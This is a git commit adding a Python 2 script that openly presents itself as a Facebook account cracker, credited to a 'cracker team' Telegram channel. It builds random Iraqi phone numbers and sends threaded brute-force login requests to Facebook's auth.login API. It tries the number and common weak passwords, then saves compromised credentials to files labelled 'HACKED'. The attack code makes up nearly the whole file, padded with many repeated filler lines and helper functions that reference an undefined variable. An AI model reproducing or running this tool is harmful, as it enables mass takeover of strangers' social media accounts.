539f215b203587835831b7cb50c43f593780aa7a
HaMa LoRdy EzRaiLy <63779958+hamalord4444@users.noreply.github.com>
2021-07-30 20:16:05 +0300

    Add files via upload

---
+++ Hacking-Lord-Comm_V3.py
@@ -0,0 +1,474 @@
+# HAMA LORDY EZRAILY 4444
+import os, sys, re, time, datetime, json, random, datetime, hashlib, threading, urllib, cookielib, getpass, mechanize, requests, tqdm
+os.system('rm -rf .txt')
+for n in range(4444):
+    nmbr = random.randint(1111111, 9999999)
+    sys.stdout = open('.txt', 'a')
+    print nmbr
+    sys.stdout.flush()
+try:
+    import requests
+except ImportError:
+    os.system('pip2 install tqdm')
+
+try:
+    import requests
+except ImportError:
+    os.system('pip2 install requests')
+
+try:
+    import mechanize
+except ImportError:
+    os.system('pip2 install mechanize')
+    time.sleep(0)
+    os.system('python2 LORD.py')
+import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
+from multiprocessing.pool import ThreadPool
+from requests.exceptions import ConnectionError
+from mechanize import Browser
+reload(sys)
+sys.setdefaultencoding('utf8')
+br = mechanize.Browser()
+br.set_handle_robots(False)
+br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
+br.addheaders = [('User-Agent', 'Mozilla/5.0 (Linux; Android 8.1.0; Chrome/79.0.3945.116) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36')]
+br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+def keluar():
+    print 'Thanks.'
+    os.sys.exit()
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+
+def acak(b):
+    w = 'ahtdzjc'
+    d = ''
+    for i in x:
+        d += '!' + w[random.randint(0, len(w) - 1)] + i
+
+    return cetak(d)
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+
+def cetak(b):
+    w = 'ahtdzjc'
+    for i in w:
+        j = w.index(i)
+        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))
+
+    x += '\x1b[0m'
+    x = x.replace('!0', '\x1b[0m')
+    sys.stdout.write(x + '\n')
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+
+def jalan(z):
+    for e in z + '\n':
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.1)
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+
+def tik():
+    titik = ['.   ', '..  ', '... ']
+    for o in titik:
+        print '\r\x1b[1;94mWaiting... \x1b[1;93m' + o,
+        sys.stdout.flush()
+        time.sleep(1)
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+
+def psb(z):
+    for e in z + '\n':
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.03)
+logo = logo = logo = logo = """"""
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+back = 0
+successful = []
+cpb = []
+oks = []
+id = []
+listgrup = []
+vulnot = "\033[97mNot Vuln"
+vuln = "\033[97mVuln"
+os.system("clear")
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+
+import os, sys, re, time, datetime, json, random, datetime, hashlib, threading, urllib, cookielib, getpass, mechanize, requests, tqdm
+os.system('rm -rf .txt')
+for n in range(4444):
+    nmbr = random.randint(1111111, 9999999)
+    sys.stdout = open('.txt', 'a')
+    print nmbr
+    sys.stdout.flush()
+try:
+    import requests
+except ImportError:
+    os.system('pip2 install tqdm')
+
+try:
+    import requests
+except ImportError:
+    os.system('pip2 install requests')
+
+try:
+    import mechanize
+except ImportError:
+    os.system('pip2 install mechanize')
+    time.sleep(0)
+    os.system('python2 LORD.py')
+import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
+from multiprocessing.pool import ThreadPool
+from requests.exceptions import ConnectionError
+from mechanize import Browser
+reload(sys)
+sys.setdefaultencoding('utf8')
+br = mechanize.Browser()
+br.set_handle_robots(False)
+br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
+br.addheaders = [('user-agent', 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109/it_IT;FBAV/328.0.0.22.119/it_IT;FBAV/328.0.0.22.119;]')]
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+def keluar():
+    print 'Thanks.'
+    os.sys.exit()
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+
+def acak(b):
+    w = 'ahtdzjc'
+    d = ''
+    for i in x:
+        d += '!' + w[random.randint(0, len(w) - 1)] + i
+
+    return cetak(d)
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+
+def cetak(b):
+    w = 'ahtdzjc'
+    for i in w:
+        j = w.index(i)
+        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))
+
+    x += '\x1b[0m'
+    x = x.replace('!0', '\x1b[0m')
+    sys.stdout.write(x + '\n')
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+
+def jalan(z):
+    for e in z + '\n':
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.1)
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+
+def tik():
+    titik = ['.   ', '..  ', '... ']
+    for o in titik:
+        print '\r\x1b[1;94mWaiting... \x1b[1;93m' + o,
+        sys.stdout.flush()
+        time.sleep(1)
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+
+def psb(z):
+    for e in z + '\n':
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.03)
+logo = logo = logo = logo = """"""
+back = 0
+successful = []
+cpb = []
+oks = []
+id = []
+listgrup = []
+vulnot = "\033[97mNot Vuln"
+vuln = "\033[97mVuln"
+os.system("clear")
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+print '\x1b\xe2\xe2[41mYOU CANT'
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo = logo = logo = """ """
+logo = logo ="""
+
+\033[41m
+   ___                            ___  
+  (   )                          (   ) 
+   | |    .--.    ___ .-.      .-.| |  
+   | |   /    \  (   )   \    /   \ |  
+   | |  |  .-. ;  | ' .-. ;  |  .-. |  
+   | |  | |  | |  |  / (___) | |  | |  
+   | |  | |  | |  | |        | |  | |  
+   | |  | |  | |  | |        | |  | |  
+   | |  | '  | |  | |        | '  | |  
+   | |  '  `-' /  | |        ' `-'  /  
+  (___)  `.__.'  (___)        `.__,'   
+ ________________________________________
+|                                        |
+|  \033[42mAUTHOR\033[40m>>> \033[42mHAMA LORDY EZRAILY          |
+|                                        |
+|  \033[42mCHANNEL_TELEGRAM\033[40m>>> \033[42m@CRACKER_TEAM_KURD|
+|                                        |
+|  \033[42mMY_TELEGRAM\033[40m>>> \033[42m@H_4_4_4_4_D           |
+|                                        |
+|  \033[42mLANGUAGE\033[40m>>> \033[42mpython 2.7              |
+ -_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+
+"""
+
+def LORD():
+    os.system('clear')
+    print logo
+    print 10 * '\x1b[1;91m<LORD>'
+    print '                             '
+    print ' \x1b[1;91m[1]\x1b[1;91m START CRACK BY NUMBER'
+    print '                             '
+    print ' \x1b[1;91m[2] \033[1;91mFREE MODE'
+    print '                             '
+    print ' \033[1;91m[0]\x1b[1;91m EXIT                                           '
+    print '                             '
+    print 10 * '\x1b[1;91m<LORD>'
+    action()
+
+
+def action():
+    global cpb
+    global oks
+    bch = raw_input('\n\x1b[1;91mCHOOSE \x1b[1;94m>>>\x1b[1;90m  ')
+    if bch == '':
+        print '\033[91m[!] Fill in correctly'
+        action()
+    elif bch == '1':
+        os.system('clear')
+        print logo
+        print '\x1b[1;91m  { 750 751 752 770 772 773 774 780 781 782 783 }'
+        try:
+            c = raw_input('\x1b[1;91m CHOOSE CODE  : ')
+            k = '+964'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '\033[91m[!] File Not Found'
+            raw_input('\n[ Back ]')
+            LORD()
+
+    elif bch == '2':
+        os.system('clear')
+        print logo
+        print "\033[91m  { CHOOSE COUNTRY code & number code// Example : +964750 } "
+        try:
+            c = raw_input('\033[1;92mCHOOSE CODE  : ')
+            k = ''
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '\033[91m[!] File Not Found'
+            raw_input('\n[ Back ]')
+            LORD()
+    elif bch == '0':
+        exb()
+    else:
+        print '\033[91m[!] Fill in correctly'
+        action()
+    xxx = str(len(id))
+    psb('[\xe2\x9c\x93] ALL CRACK / ' + xxx)
+    time.sleep(0)
+    psb('\x1b[1;90m[\xe2\x9c\x93]\x1b[1;90m WAIT ...')
+    time.sleep(0)
+    psb('\033[41m[!] TO STOP THE TOOL CTRL+z')
+    time.sleep(0)
+    print 20 * '\x1b[1;92m>>>>'
+    def main(arg):
+        user = arg
+        try:
+            os.mkdir('save')
+        except OSError:
+            pass
+        try:
+            pass1 = user
+            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+            q = json.load(data)
+            if 'access_token' in q:
+                print '\x1b[1;92m[HACKED BY LORD]\x1b[1;92m ' + k + c + user + ' >>> ' + pass1 + '\n' + '\n'
+                okb = open('save/successfull.txt', 'a')
+                okb.write(k + c + user + '>>>' + pass1 + '\n')
+                okb.close()
+                oks.append(c + user + pass1)
+            elif 'www.facebook.com' in q['error_msg']:
+                print '\x1b[1;91m[CHICKPOINT]\x1b[1;91m ' + k + c + user + ' >>> ' + pass1 + '\n'
+                cps = open('save/chickpoint.txt', 'a')
+                cps.write(k + c + user + '>>>' + pass1 + '\n')
+                cps.close()
+                cpb.append(c + user + pass1)
+            else:
+                pass2 = '1122334455'
+            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+            q = json.load(data)
+            if 'access_token' in q:
+                print '\x1b[1;92m[HACKED BY HAMA_LORD]\x1b[1;92m ' + k + c + user + ' >>> ' + pass2 + '\n' + '\n'
+                okb = open('save/successfull.txt', 'a')
+                okb.write(k + c + user + '>>>' + pass2 + '\n')
+                okb.close()
+                oks.append(c + user + pass2)
+            elif 'www.facebook.com' in q['error_msg']:
+                print '\x1b[1;91m[CHICKPOINT]\x1b[1;91m ' + k + c + user + ' >>> ' + pass2 + '\n'
+                cps = open('save/chickpoint.txt', 'a')
+                cps.write(k + c + user + '>>>' + pass2 + '\n')
+                cps.close()
+                cpb.append(c + user + pass2)
+            else:
+                pass3 = '1234554321'
+            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+            q = json.load(data)
+            if 'access_token' in q:
+                print '\x1b[1;92m[HACKED BY LORD]\x1b[1;92m ' + k + c + user + ' >>> ' + pass3 + '\n' + '\n'
+                okb = open('save/successfull.txt', 'a')
+                okb.write(k + c + user + '>>>' + pass3 + '\n')
+                okb.close()
+                oks.append(c + user + pass3)
+            elif 'www.facebook.com' in q['error_msg']:
+                print '\x1b[1;91m[CHICKPOINT]\x1b[1;91m ' + k + c + user + ' >>> ' + pass3 + '\n'
+                cps = open('save/chickpoint.txt', 'a')
+                cps.write(k + c + user + '>>>' + pass3 + '\n')
+                cps.close()
+                cpb.append(c + user + pass3)
+        except:
+            pass
+    p = ThreadPool(30)
+    p.map(main, id)
+    print 42 * '\x1b[1;94m='
+    print '\033[91m[[\xe2\x9c\x93]]>\x1b[1;91m HACK FINISH ....'
+    print ' [\xe2\x9c\x93]\x1b[1;92m OK/\x1b[1;91mCP :\033[92m ' + str(len(oks)) + '\033[92m /\033[91m ' + str(len(cpb))
+    print ' [\033[91m\xe2\x9c\x93]\x1b[1;91m CP File Has Been Saved : save/checkpoint.txt'
+    raw_input('\n[Press Enter To Go Back]')
+    os.system('python2 Hacking_Lord_Comm_V3.py')
+if __name__ == '__main__':
+    LORD()
